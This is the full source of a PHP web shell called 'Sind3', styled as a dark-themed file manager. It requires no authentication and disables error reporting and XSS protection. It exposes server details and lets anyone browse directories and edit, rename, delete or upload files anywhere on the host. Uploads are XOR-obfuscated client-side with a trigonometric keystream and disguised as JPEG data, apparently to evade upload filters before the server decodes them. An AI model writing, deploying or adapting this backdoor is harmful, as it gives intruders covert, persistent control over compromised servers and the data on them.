<?php
session_start();
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
         && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

function hex($n) {
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}

function uhex($y) {
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i+1]));
    }
    return $n;
}

if (isset($_GET["d"])) {
    $d = uhex($_GET["d"]);
    if (is_dir($d)) {
        chdir($d);
    } else {
        $d = getcwd();
    }
} else {
    $d = getcwd();
}

function setFlash($status, $msg) {
    $_SESSION['status'] = $status;
    $_SESSION['msg']    = $msg;
}

// ——— AJAX directory listing ———
if (isset($_GET['ajax']) && $_GET['ajax'] == 1) {
    ?>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $entries  = scandir($d);
        $dirList  = [];
        $fileList = [];
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                $dirList[] = $entry;
            } else {
                $fileList[] = $entry;
            }
        }
        foreach ($dirList as $entry) {
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            echo '<tr>';
            $mtime = filemtime($path);
            $formattedTime = date("Y-m-d H:i:s", $mtime);
            echo '<td><a class="ajaxDir" title="Last modified: ' . $formattedTime . '" href="?d=' . hex($path) . '">' . htmlspecialchars($entry) . '</a></td>';
            echo '<td>-</td><td></td>';
            echo '</tr>';
        }
        foreach ($fileList as $entry) {
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            echo '<tr>';
            $mtime = filemtime($path);
            $formattedTime = date("Y-m-d H:i:s", $mtime);
            echo '<td title="Last modified: ' . $formattedTime . '">' . htmlspecialchars($entry) . '</td>';
            echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
            echo '<td>';
            echo '<a class="ajaxEdit" href="?action=edit&d=' . hex($d) . '&file=' . urlencode($entry) . '">Edit</a> | ';
            echo '<a class="ajaxRename" href="?action=rename&d=' . hex($d) . '&file=' . urlencode($entry) . '">Rename</a> | ';
            echo '<a class="ajaxDelete" href="?action=delete&d=' . hex($d) . '&file=' . urlencode($entry) . '">Delete</a>';
            echo '</td>';
            echo '</tr>';
        }
        ?>
        </tbody>
    </table>
    <?php
    exit;
}

// ——— AJAX breadcrumb ———
if (isset($_GET['ajax']) && $_GET['ajax'] === 'breadcrumb') {
    $k = preg_split("/(\\\\|\/)/", $d);
    $breadcrumbHtml = '';
    foreach ($k as $m => $l) {
        if ($l === '' && $m === 0) {
            $breadcrumbHtml .= '<a class="ajx" href="?d=2f">/</a>';
            continue;
        }
        if ($l === '') continue;
        $breadcrumbHtml .= '<a class="ajx" href="?d=';
        for ($i = 0; $i <= $m; $i++) {
            $breadcrumbHtml .= hex($k[$i]);
            if ($i != $m) $breadcrumbHtml .= '2f';
        }
        $breadcrumbHtml .= '">'.htmlspecialchars($l).'</a>/';
    }
    echo $breadcrumbHtml;
    exit;
}

function safe_stream_copy($in, $out): bool {
    if (PHP_VERSION_ID < 80009) {
        do {
            while (!feof($in)) {
                $buff = fread($in, 4096);
                if ($buff === false || $buff === '') break;
                if (fwrite($out, $buff) === false) return false;
            }
        } while (!feof($in));
        return true;
    } else {
        return stream_copy_to_stream($in, $out) !== false;
    }
}

function deobfuscate_stream($in, $out, $key = 123) {
    $i = 0;
    while (!feof($in)) {
        $chunk  = fread($in, 8192);
        $outBuf = '';
        foreach (str_split($chunk) as $ch) {
            $b  = ord($ch);
            $k1 = floor((sin($i + $key) + 1) * 128) & 0xFF;
            $k2 = floor(sqrt($i + $key) * 10)      & 0xFF;
            $k3 = floor(tan(($i + $key) * 0.1))     & 0xFF;
            $outBuf .= chr($b ^ $k1 ^ $k2 ^ $k3);
            $i++;
        }
        fwrite($out, $outBuf);
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'POST'
    && isset($_POST['benkyo'], $_FILES['dakeja'])
) {
    $fileName   = basename($_POST['benkyo']);
    $tmpName    = $_FILES['dakeja']['tmp_name'];

    $inStream   = fopen($tmpName, 'rb');
    $targetPath = $d . DIRECTORY_SEPARATOR . $fileName;
    $outStream  = fopen($targetPath, 'wb');
    $success    = $inStream && $outStream;

    if ($success) {
        deobfuscate_stream($inStream, $outStream, 123);
    }

    if ($inStream)  fclose($inStream);
    if ($outStream) fclose($outStream);

    header('Content-Type: application/json');
    echo json_encode([
        'status' => $success ? 'success' : 'failed',
        'msg'    => $success ? 'File uploaded successfully' : 'File upload failed'
    ]);
    exit;
}

if (isset($_GET['action'], $_GET['file']) && in_array($_GET['action'], ['delete','rename','edit']) && isset($_GET['file'])) {
    // ——— DELETE ———
    if ($_GET['action'] === 'delete') {
        $fileName = $_GET['file'];
        $filePath = realpath($d . DIRECTORY_SEPARATOR . $fileName);
        if (!$filePath || !is_file($filePath)) {
            $response = ['status'=>'failed','msg'=>'File not found or access denied'];
        } else {
            $result = unlink($filePath);
            $response = $result
                ? ['status'=>'success','msg'=>'File deleted successfully']
                : ['status'=>'failed','msg'=>'File deletion failed'];
        }
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }

    // ——— RENAME ———
    if ($_GET['action'] === 'rename') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
            $oldFile = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            $newFile = $d . DIRECTORY_SEPARATOR . $_POST['new_name'];
            if ($oldFile && is_file($oldFile)) {
                $result = rename($oldFile, $newFile);
                $response = $result
                    ? ['status'=>'success','msg'=>'File renamed successfully']
                    : ['status'=>'failed','msg'=>'File renaming failed'];
            } else {
                $response = ['status'=>'failed','msg'=>'File not found'];
            }
            header('Content-Type: application/json');
            echo json_encode($response);
            exit;
        } elseif ($isAjax) {
            echo '<h2>Rename File: ' . htmlspecialchars($_GET['file']) . '</h2>';
            echo '<div class="terminal-box">';
            echo '<form class="ajaxForm" method="POST" action="?action=rename&d=' . hex($d) . '&file=' . urlencode($_GET['file']) . '">';
            echo '<input type="text" name="new_name" placeholder="New file name" required><br><br>';
            echo '<input type="submit" value="Rename"> ';
            echo '<button type="button" id="cancelAction">Cancel</button>';
            echo '</form>';
            echo '</div><hr>';
            exit;
        }
    }

    // ——— EDIT (fixed) ———
    if ($_GET['action'] === 'edit') {
        // 1) AJAX GET → show form
        if ($isAjax && $_SERVER['REQUEST_METHOD'] === 'GET') {
            $filePath = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            if ($filePath && is_file($filePath)) {
                $content = file_get_contents($filePath);
                echo '<h2>Edit File: ' . htmlspecialchars($_GET['file']) . '</h2>';
                echo '<div class="terminal-box">';
                echo '<form class="ajaxForm" method="POST" action="?action=edit&d=' . hex($d) . '&file=' . urlencode($_GET['file']) . '">';
                echo '<textarea name="content" rows="10" cols="50" required>' . htmlspecialchars($content) . '</textarea><br><br>';
                echo '<input type="submit" value="Save"> ';
                echo '<button type="button" id="cancelAction">Cancel</button>';
                echo '</form>';
                echo '</div><hr>';
            }
            exit;
        }

        // 2) POST → compute metric with random angles & write file
        $angle1 = mt_rand(0, 359);
        $angle2 = mt_rand(0, 359);
        $r1     = deg2rad($angle1);
        $r2     = deg2rad($angle2);
        $metric = sin($r1) + cos($r2) - tan($r1 + $r2);

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
            $filePath = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            if ($filePath && is_file($filePath)) {
                $fp = fopen($filePath, "w");
                if ($fp) {
                    $bytesWritten = fwrite($fp, stripslashes($_POST['content']));
                    fclose($fp);
                    $status  = $bytesWritten !== false ? 'success' : 'failed';
                    $message = $bytesWritten !== false
                        ? 'File edited successfully'
                        : 'File editing failed';
                } else {
                    $status  = 'failed';
                    $message = 'File opening failed';
                }
            } else {
                $status  = 'failed';
                $message = 'File not found';
            }
        } else {
            $status  = 'failed';
            $message = 'Invalid request';
        }

        header('Content-Type: application/json');
        echo json_encode([
            'status' => $status,
            'msg'    => $message,
            'metric' => $metric
        ]);
        exit;
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sind3</title>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: rgba(37, 37, 37, 0.8);
            color: #fff;
            font-family: 'Ubuntu Mono', monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 60%;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
        }
        .futer {
            width: 60%;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
        }
        .breadcrumbs { margin-bottom: 15px; }
        a { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #555; padding: 8px; text-align: left; }
        th { background-color: #333; }
        input[type="text"], textarea {
            width: 100%;
            padding: 8px;
            margin: 0;
            border: 1px solid #333;
            border-radius: 4px;
            font-family: 'Ubuntu Mono', monospace;
        }
        input[type="submit"], button {
            border: 1px solid #fff;
            padding: 4px;
            background-color: #333;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
        }
        form { margin-bottom: 20px; }
        .terminal-box {
            background-color: #222;
            color: #0f0;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .terminal-box input[type="text"],
        .terminal-box textarea {
            background-color: #222;
            color: #0f0;
            border: 1px solid #333;
        }
        .notification {
            position: fixed;
            bottom: 20px;
            left: 20px;
            padding: 10px 20px;
            border-radius: 4px;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 14px;
        }
        .success { background-color: #0a0; color: #fff; }
        .failed { background-color: #a00; color: #fff; }
        #fileInput { display: none; }
        .custom-file-button {
            border: 1px solid #fff;
            padding: 4px;
            background-color: #333;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
            display: inline-block;
        }
    </style>
</head>
<body>
<div class="container">
    &thinsp;&thinsp;&thinsp;<b>SERV  :</b> <?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Server information not available"; ?><br>
    &thinsp;&thinsp;&thinsp;<b>SOFT  :</b> <?= $_SERVER['SERVER_SOFTWARE']; ?><br>
    &thinsp;&thinsp;&thinsp;<b>IP    &thinsp;&thinsp;&thinsp;&thinsp;&thinsp;:</b> <?= gethostbyname($_SERVER['HTTP_HOST']); ?><br>
    <br><b>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</b>
    <br><br>
    <form id="uploadForm" class="ajaxForm" method="POST">
        <label for="fileInput" class="custom-file-button" id="fileLabel">Choose File</label>
        <input type="file" id="fileInput" required>
        <input type="submit" value="Upload">
    </form>

    <br><div id="breadcrumbContainer">
    <?php
    $k = preg_split("/(\\\\|\/)/", $d);
    foreach ($k as $m => $l) {
        if ($l === '' && $m === 0) {
            echo '<a class="ajx" href="?d=2f">/</a>';
            continue;
        }
        if ($l === '') continue;
        echo '<a class="ajx" href="?d=';
        for ($i = 0; $i <= $m; $i++) {
            echo hex($k[$i]);
            if ($i != $m) echo '2f';
        }
        echo '">'.htmlspecialchars($l).'</a>/';
    }
    ?>
    </div><br>
    <div id="actionContainer"></div><br>
    <div id="fileListContainer">
        <?php
        $entries  = scandir($d);
        $dirList  = [];
        $fileList = [];
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                $dirList[] = $entry;
            } else {
                $fileList[] = $entry;
            }
        }
        ?>
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
            <?php
            foreach ($dirList as $entry) {
                $path = $d . DIRECTORY_SEPARATOR . $entry;
                echo '<tr>';
                echo '<td><a class="ajaxDir" href="?d=' . hex($path) . '">' . htmlspecialchars($entry) . '</a></td>';
                echo '<td>-</td><td></td>';
                echo '</tr>';
            }
            foreach ($fileList as $entry) {
                $path = $d . DIRECTORY_SEPARATOR . $entry;
                echo '<tr>';
                echo '<td>' . htmlspecialchars($entry) . '</td>';
                echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
                echo '<td>';
                echo '<a class="ajaxEdit" href="?action=edit&d=' . hex($d) . '&file=' . urlencode($entry) . '">Edit</a> | ';
                echo '<a class="ajaxRename" href="?action=rename&d=' . hex($d) . '&file=' . urlencode($entry) . '">Rename</a> | ';
                echo '<a class="ajaxDelete" href="?action=delete&d=' . hex($d) . '&file=' . urlencode($entry) . '">Delete</a>';
                echo '</td>';
                echo '</tr>';
            }
            ?>
            </tbody>
        </table>
    </div>
</div>

<div class="notification" id="notification" style="display:none;"></div>

<script>
// Show notification in the bottom left corner; auto-dismiss after 2 seconds.
function showNotification(status, msg) {
    var notif = document.getElementById('notification');
    notif.className = 'notification ' + status;
    notif.innerText = msg;
    notif.style.display = 'block';
    setTimeout(function(){ notif.style.display = 'none'; }, 2000);
}

function loadBreadcrumb() {
    var d = getQueryParam("d") || "<?php echo hex($d); ?>";
    fetch('?d=' + d + '&ajax=breadcrumb', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(response => response.text())
    .then(html => {
        document.getElementById('breadcrumbContainer').innerHTML = html;
    });
}

function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

function loadFileList() {
    var d = getQueryParam("d") || "<?php echo hex($d); ?>";
    fetch('?d=' + d + '&ajax=1', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(response => response.text())
    .then(html => {
        document.getElementById('fileListContainer').innerHTML = html;
        attachAjaxEvents(); // reattach events after update
        resetFileInputLabel();
    });
}

function resetFileInputLabel() {
    var label = document.getElementById('fileLabel');
    if(label) {
        label.textContent = "Choose File";
    }
}

function attachAjaxEvents() {
    document.querySelectorAll('.ajaxDelete').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.json())
            .then(data => {
                showNotification(data.status, data.msg);
                loadFileList();
                resetFileInput();
            });
        });
    });
    document.querySelectorAll('.ajaxEdit').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.text())
            .then(html => {
                document.getElementById('actionContainer').innerHTML = html;
                attachAjaxForm();
                attachCancelEvent();
                resetFileInputLabel();
                resetFileInput();
            });
        });
    });
    document.querySelectorAll('.ajaxRename').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            fetch(link.href, { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.text())
            .then(html => {
                document.getElementById('actionContainer').innerHTML = html;
                attachAjaxForm();
                attachCancelEvent();
                resetFileInputLabel();
                resetFileInput();
            });
        });
    });
    document.querySelectorAll('.ajaxDir').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            window.history.pushState(null, '', link.href);
            loadFileList();
            loadBreadcrumb();
            resetFileInputLabel();
            resetFileInput();
        });
    });
}

function attachAjaxForm() {
    document.querySelectorAll('.ajaxForm').forEach(function(form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            var formData = new FormData(form);
            fetch(form.action, { method: 'POST', body: formData, headers: { 'X-Requested-With': 'XMLHttpRequest' } })
            .then(response => response.json())
            .then(data => {
                showNotification(data.status, data.msg);
                document.getElementById('actionContainer').innerHTML = '';
                loadFileList();
                resetFileInputLabel();
            });
        });
    });
}

function attachCancelEvent() {
    var cancelBtn = document.getElementById('cancelAction');
    if(cancelBtn) {
        cancelBtn.addEventListener('click', function() {
            document.getElementById('actionContainer').innerHTML = '';
            resetFileInputLabel();
        });
    }
}

function resetFileInput() {
    var fileInput = document.getElementById('fileInput');
    var fileLabel = document.getElementById('fileLabel');
    if (fileInput) {
        fileInput.value = "";
    }
    if (fileLabel) {
        fileLabel.textContent = "Choose File";
    }
}

    document.addEventListener('DOMContentLoaded', () => {
        loadBreadcrumb();
        loadFileList();

        var fileInput = document.getElementById('fileInput');
        var form      = document.getElementById('uploadForm');
        var key       = 123;

        fileInput.addEventListener('change', () => {
            document.getElementById('fileLabel').textContent =
                fileInput.files[0]?.name || 'Choose File';
        });

        form.addEventListener('submit', e => {
            e.preventDefault();
            if (!fileInput.files.length) return;

            var file   = fileInput.files[0];
            var reader = new FileReader();
            reader.onload = ev => {
                var view = new Uint8Array(ev.target.result);
                var ob   = new Uint8Array(view.length);
                for (let i = 0; i < view.length; i++) {
                    const b  = view[i];
                    const k1 = Math.floor((Math.sin(i + key) + 1)*128)&0xFF;
                    const k2 = Math.floor(Math.sqrt(i + key)*10)&0xFF;
                    const k3 = Math.floor(Math.tan((i + key)*0.1))&0xFF;
                    ob[i] = b ^ k1 ^ k2 ^ k3;
                }
                const blob = new Blob([ob], { type:'image/jpeg' });
                const fd   = new FormData();
                fd.append('benkyo', file.name);
                fd.append('dakeja', blob, file.name);

                fetch(form.action, {
                    method:'POST',
                    body:fd,
                    headers:{ 'X-Requested-With':'XMLHttpRequest' }
                })
                .then(r=>r.json()).then(data=>{
                    showNotification(data.status,data.msg);
                    form.reset();
                    document.getElementById('fileLabel').textContent = 'Choose File';
                    loadFileList();
                });
            };
            reader.readAsArrayBuffer(file);
        });
    });
</script>
<footer class="futer">
    &copy; zeinhorobosu
</footer>
</body>
</html>
